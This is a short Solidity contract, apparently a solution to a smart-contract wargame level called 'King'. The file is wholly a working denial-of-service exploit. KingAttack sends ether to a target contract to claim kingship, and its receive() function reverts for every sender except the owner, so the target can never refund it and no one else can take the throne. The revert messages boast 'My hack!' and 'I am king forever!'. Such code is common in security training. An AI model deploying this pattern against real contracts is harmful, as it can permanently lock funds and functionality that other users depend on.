// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IKing {
    function _king() external view returns (address payable);
}

contract KingAttack {

    address public owner;
    IKing targetContract;

    constructor(address _targetAddr) {
        targetContract = IKing(_targetAddr);
        owner = msg.sender;
    }

    function sendTransaction() public payable {
        require(msg.sender == owner, "My hack!");
        (bool success, ) = address(targetContract).call{value: msg.value}("");
        require(success, "Transaction failed");

    }

    receive() external payable {
        require(msg.sender == owner, "I am king forever!");
    }
}